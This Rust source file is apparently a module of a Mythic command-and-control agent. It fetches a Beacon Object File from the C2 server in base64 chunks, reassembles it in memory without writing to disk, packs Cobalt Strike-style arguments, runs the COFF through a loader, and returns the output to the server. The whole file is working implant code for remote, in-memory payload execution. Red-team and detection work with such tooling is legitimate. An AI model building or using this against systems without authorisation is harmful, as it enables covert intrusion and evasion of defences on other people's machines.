//! BOF (Beacon Object File) execution module
//!
//! Provides in-memory COFF loading and execution capabilities using the coffeeldr library.
//! This module is Windows-only; on Linux it returns an error message.

#[cfg(target_os = "windows")]
pub mod loader;

// args module works on all platforms (used for packing arguments)
pub mod args;

use crate::agent::AgentTask;
#[allow(unused_imports)]
use crate::{mythic_error, mythic_success};
use serde::Deserialize;
#[cfg(target_os = "windows")]
use serde_json::json;
use std::error::Error;
use std::sync::mpsc;

/// Chunk size used for file transfer (512KB)
const CHUNK_SIZE: usize = 512000;

/// Struct holding the BOF task parameters
#[derive(Deserialize)]
struct BofArgs {
    /// File ID from Mythic (references uploaded BOF file)
    file: String,
    /// Arguments in CS format: "short:123 int:456 str:hello wstr:C:\\path bin:base64"
    arguments: String,
    /// Entry point function name (default: "go")
    entry_point: String,
}

/// Execute a BOF file received from Mythic
///
/// This function:
/// 1. Receives BOF file chunks from Mythic
/// 2. Reassembles the BOF in memory
/// 3. Parses CS-compatible arguments
/// 4. Loads and executes the COFF using coffeeldr
/// 5. Captures and returns BeaconOutput
///
/// # Arguments
/// * `tx` - Channel for sending messages to Mythic
/// * `rx` - Channel for receiving messages from Mythic
pub fn execute_bof(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    #[cfg(target_os = "windows")]
    {
        // 1. Parse initial task
        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let bof_args: BofArgs = serde_json::from_str(&task.parameters)?;

        // 2. Request BOF file chunks from Mythic
        tx.send(json!({
            "task_id": task.id,
            "user_output": "Receiving BOF data...\n",
        }))?;

        let bof_data = receive_file_chunks(&tx, &rx, &task.id, &bof_args.file)?;

        tx.send(json!({
            "task_id": task.id,
            "user_output": format!("Received {} bytes, loading COFF...\n", bof_data.len()),
        }))?;

        // 3. Parse arguments into CS-compatible format
        let packed_args = if bof_args.arguments.is_empty() {
            Vec::new()
        } else {
            args::pack_arguments(&bof_args.arguments)?
        };

        // 4. Load and execute BOF
        let output = loader::execute_coff(
            &bof_data,
            &bof_args.entry_point,
            &packed_args,
        )?;

        // 5. Send output back to Mythic
        tx.send(mythic_success!(task.id, output))?;
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    {
        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        tx.send(mythic_error!(
            task.id,
            "BOF execution is only supported on Windows"
        ))?;
        Ok(())
    }
}

/// Receive file chunks from Mythic and reassemble into a single buffer
///
/// Uses the same chunking protocol as the upload command but keeps
/// data in memory instead of writing to disk.
#[cfg(target_os = "windows")]
fn receive_file_chunks(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: &mpsc::Receiver<serde_json::Value>,
    task_id: &str,
    file_id: &str,
) -> Result<Vec<u8>, Box<dyn Error>> {
    use crate::agent::ContinuedData;

    // Request first chunk
    tx.send(json!({
        "upload": json!({
            "chunk_size": CHUNK_SIZE,
            "file_id": file_id,
            "chunk_num": 1,
            "full_path": "",  // Not writing to disk
        }),
        "task_id": task_id,
    }))?;

    // Receive first chunk
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued: ContinuedData = serde_json::from_str(&task.parameters)?;

    let mut file_data = base64::decode(
        continued
            .chunk_data
            .ok_or_else(|| std::io::Error::other("Missing chunk data"))?,
    )?;

    let total_chunks = continued.total_chunks.unwrap_or(1);

    // Receive remaining chunks
    for chunk_num in 2..=total_chunks {
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": file_id,
                "chunk_num": chunk_num,
                "full_path": "",
            }),
            "task_id": task_id,
        }))?;

        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued: ContinuedData = serde_json::from_str(&task.parameters)?;
        file_data.append(&mut base64::decode(
            continued
                .chunk_data
                .ok_or_else(|| std::io::Error::other("Missing chunk data"))?,
        )?);
    }

    Ok(file_data)
}
